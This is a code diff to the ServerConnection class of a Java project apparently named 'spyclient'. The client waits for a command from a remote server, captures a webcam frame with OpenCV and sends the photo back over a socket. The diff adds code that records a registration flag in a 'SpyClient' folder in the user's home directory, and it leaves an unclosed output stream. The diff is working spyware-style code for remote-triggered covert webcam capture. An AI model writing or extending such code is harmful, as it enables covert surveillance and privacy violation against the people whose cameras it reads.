@@ -10,6 +10,7 @@ import java.io.*;
 import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.util.Properties;
 import java.util.Queue;
 import java.util.concurrent.ConcurrentLinkedQueue;
 import java.util.concurrent.SynchronousQueue;
@@ -61,7 +62,11 @@ public class ServerConnection implements Runnable{
 					Thread.sleep(2000);
 					log.info("Get SPH message, sending photo to server");
 					sendPhoto();
-					sendImage("C:\\Users\\PC-Martyna\\IdeaProjects\\spyclient\\src\\main\\resources\\kupa.jpg");
+				}
+				if (result.equals(Header.SUCCESSFUL_REGISTRATION.toString())){
+					log.info("Get ROK message, saving registration info");
+					saveAsRegistered();
+
 				}
 			}
 		} catch (IOException e) {
@@ -77,6 +82,30 @@ public class ServerConnection implements Runnable{
 		}
 	}
 
+	private void saveAsRegistered() {
+		String propertiesPath = getPropertiesDirectoryPath() + File.separator + "client.properties";
+		Properties properties = new Properties();
+
+		OutputStream outputStream = null;
+		try {
+			OutputStream output = new FileOutputStream(propertiesPath);
+			properties.setProperty("registered", "true");
+			properties.store(output,null);
+		} catch (FileNotFoundException e) {
+			e.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		} finally {
+			if (outputStream != null) {
+				try {
+					outputStream.close();
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+
 	private void sendPhoto(){
 		OpenCVFrameGrabber grabber = new OpenCVFrameGrabber(0);
 		OpenCVFrameConverter.ToIplImage converter = new OpenCVFrameConverter.ToIplImage();
@@ -88,8 +117,8 @@ public class ServerConnection implements Runnable{
 			BufferedImage img = new Java2DFrameConverter().convert(frame);
 			ByteArrayOutputStream baos = new ByteArrayOutputStream();
 			ImageIO.write(img, "jpg", baos);
-			baos.flush();
 			byte[] image = baos.toByteArray();
+			baos.flush();
 			baos.close();
 
 			DataOutputStream dos = new DataOutputStream(taskSocket.getOutputStream());
@@ -102,8 +131,6 @@ public class ServerConnection implements Runnable{
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
-
-
 	}
 
 	File loadImage(String path) {
@@ -157,5 +184,14 @@ public class ServerConnection implements Runnable{
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
+	}
+
+	public static String getPropertiesDirectoryPath(){
+		String homeDirectory = System.getProperty("user.home");
+		String propertiesDirectory = homeDirectory + File.separator + "SpyClient";
+		File newDirectory = new File(propertiesDirectory);
+		newDirectory.mkdir();
+
+		return propertiesDirectory;
 	}
 }
